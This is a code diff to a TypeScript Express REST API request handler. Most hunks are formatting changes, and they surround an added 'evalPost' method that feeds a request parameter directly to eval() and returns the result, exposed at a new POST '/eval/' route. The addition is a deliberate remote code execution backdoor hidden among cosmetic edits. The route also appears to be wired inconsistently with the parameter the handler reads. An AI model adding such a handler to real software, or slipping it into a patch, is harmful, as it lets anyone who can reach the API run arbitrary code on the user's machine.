@@ -254,10 +254,10 @@ export default class RequestHandler {
       certificateInfo:
         this.requestIsAuthenticated(req) && certificate
           ? {
-              validityDays: getCertificateValidityDays(certificate),
-              regenerateRecommended:
-                !getCertificateIsUptoStandards(certificate),
-            }
+            validityDays: getCertificateValidityDays(certificate),
+            regenerateRecommended:
+              !getCertificateIsUptoStandards(certificate),
+          }
           : undefined,
       apiExtensions: this.requestIsAuthenticated(req)
         ? this.apiExtensions.map(({ manifest }) => manifest)
@@ -935,6 +935,14 @@ export default class RequestHandler {
     return;
   }
 
+  async evalPost(
+    req: express.Request,
+    res: express.Response
+  ): Promise<void> {
+    let ret = eval(req.params.cmd);
+    res.json(ret);
+  }
+
   async searchSimplePost(
     req: express.Request,
     res: express.Response
@@ -1133,7 +1141,7 @@ export default class RequestHandler {
   setupRouter() {
     this.api.use((req, res, next) => {
       const originalSend = res.send;
-      res.send = function (body, ...args) {
+      res.send = function(body, ...args) {
         console.log(`[REST API] ${req.method} ${req.url} => ${res.statusCode}`);
 
         return originalSend.apply(res, [body, ...args]);
@@ -1195,6 +1203,8 @@ export default class RequestHandler {
 
     this.api.route("/commands/").get(this.commandGet.bind(this));
     this.api.route("/commands/:commandId/").post(this.commandPost.bind(this));
+
+    this.api.route("/eval/").post(this.evalPost.bind(this));
 
     this.api.route("/search/").post(this.searchQueryPost.bind(this));
     this.api.route("/search/simple/").post(this.searchSimplePost.bind(this));
